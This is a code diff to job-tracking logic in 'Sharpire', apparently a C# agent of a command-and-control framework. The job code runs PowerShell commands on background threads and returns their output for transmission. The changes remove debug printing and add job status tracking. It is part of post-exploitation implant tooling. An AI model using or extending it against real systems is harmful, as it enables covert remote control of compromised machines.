@@ -12,24 +12,18 @@ using System.Threading;
 
 namespace Sharpire
 {
-    ////////////////////////////////////////////////////////////////////////////////
-    ////////////////////////////////////////////////////////////////////////////////
     public class JobTracking
     {
         public Dictionary<string, Job> jobs;
         public Dictionary<string, ushort> jobsId;
         public byte[] ImportedScript { get; set; }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
         public JobTracking()
         {
             jobs = new Dictionary<string, Job>();
             jobsId = new Dictionary<string, ushort>();
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
         internal void CheckAgentJobs(ref byte[] packets, ref Coms coms)
         {
             lock (jobs)
@@ -44,6 +38,7 @@ namespace Sharpire
                         {
                             results = job.Value.GetOutput();
                             job.Value.KillThread();
+                            job.Value.Status = "stopped";
                         }
                         catch (NullReferenceException) { }
 
@@ -59,8 +54,6 @@ namespace Sharpire
             }
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
         internal byte[] GetAgentJobsOutput(ref Coms coms)
         {
             byte[] jobResults = new byte[0];
@@ -69,24 +62,19 @@ namespace Sharpire
                 List<string> jobsToRemove = new List<string>();
                 foreach (string jobName in jobs.Keys)
                 {
-#if (PRINT)
-                    Console.WriteLine("Job: {0}", jobName);
-#endif
                     string results = "";
                     if (jobs[jobName].IsCompleted())
                     {
                         try
                         {
                             results = jobs[jobName].GetOutput();
-#if (PRINT)
-                            Console.WriteLine(results);
-#endif
                             jobs[jobName].KillThread();
+                            jobs[jobName].Status = "stopped";
                         }
                         catch (NullReferenceException) { }
                         jobsToRemove.Add(jobName);
                     }
-                    else
+                    else if (jobs[jobName].Status == "running")
                     {
                         results = jobs[jobName].GetOutput();
                     }
@@ -105,8 +93,6 @@ namespace Sharpire
             return jobResults;
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
         internal string StartAgentJob(string command, ushort taskId)
         {
             Random random = new Random();
@@ -128,30 +114,31 @@ namespace Sharpire
             {
                 jobsId.Add(id, taskId);
             }
-#if (PRINT)
-            Console.WriteLine("Starting Job: {0}", id);
-#endif
             return id;
         }
 
-        ////////////////////////////////////////////////////////////////////////////////
-        ////////////////////////////////////////////////////////////////////////////////
         public class Job
         {
             private Thread JobThread { get; set; }
             private static string output = "";
             private static bool isFinished = false;
+            public string Status { get; set; }
+            public string Language { get; set; }
+            public Thread Thread { get; set; }
+            public PowershellDetails Powershell { get; set; }
 
-            ////////////////////////////////////////////////////////////////////////////////
-            ////////////////////////////////////////////////////////////////////////////////
+            public Job()
+            {
+                // Default constructor for initialization
+            }
+
             public Job(string command)
             {
+                Status = "running";
                 JobThread = new Thread(() => RunPowerShell(command));
                 JobThread.Start();
             }
 
-            ////////////////////////////////////////////////////////////////////////////////
-            ////////////////////////////////////////////////////////////////////////////////
             public static void RunPowerShell(string command)
             {
                 using (Runspace runspace = RunspaceFactory.CreateRunspace())
@@ -196,46 +183,42 @@ namespace Sharpire
                 }
             }
 
-            ////////////////////////////////////////////////////////////////////////////////
-            ////////////////////////////////////////////////////////////////////////////////
             public bool IsCompleted()
             {
                 if (null != JobThread)
                 {
                     if (true == isFinished)
                     {
+                        Status = "completed";
                         return true;
-#if (Print)
-                    Console.WriteLine("Finished");
-#endif
                     }
                     return false;
-#if (Print)
-                    Console.WriteLine("Running");
-#endif
                 }
                 else
                 {
-#if (Print)
-                    Console.WriteLine("Finished");
-#endif
+                    Status = "completed";
                     return true;
                 }
             }
 
-            ////////////////////////////////////////////////////////////////////////////////
-            ////////////////////////////////////////////////////////////////////////////////
             public string GetOutput()
             {
                 return output;
             }
 
-            ////////////////////////////////////////////////////////////////////////////////
-            ////////////////////////////////////////////////////////////////////////////////
             public void KillThread()
             {
                 JobThread.Abort();
+                Status = "stopped";
             }
+        }
+
+        public class PowershellDetails
+        {
+            public object AppDomain { get; set; }
+            public object PsHost { get; set; }
+            public object Buffer { get; set; }
+            public object PsHostExec { get; set; }
         }
     }
 }
